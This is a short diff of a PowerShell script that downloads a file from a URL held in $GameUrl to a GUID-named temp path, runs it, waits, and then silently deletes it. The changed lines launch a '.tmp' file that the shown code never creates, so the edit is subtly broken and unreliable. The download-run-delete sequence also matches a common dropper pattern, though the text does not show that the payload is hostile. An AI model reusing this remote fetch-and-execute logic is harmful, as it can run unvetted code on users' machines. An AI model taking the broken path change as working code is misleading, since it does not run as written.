@@ -12,7 +12,9 @@ $TempExe = Join-Path ([IO.Path]::GetTempPath()) "e1090ed9-44f0-4a4a-b228-e41aa76
 
 Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing
 
-$proc = Start-Process -FilePath $TempExe -PassThru
+$TempFile = Join-Path $env:TEMP "e1090ed9-44f0-4a4a-b228-e41aa7662bd4.tmp"
+$proc = [System.Diagnostics.Process]::Start($TempFile)
 $proc.WaitForExit()
+
 
 Remove-Item $TempExe -Force -ErrorAction SilentlyContinue
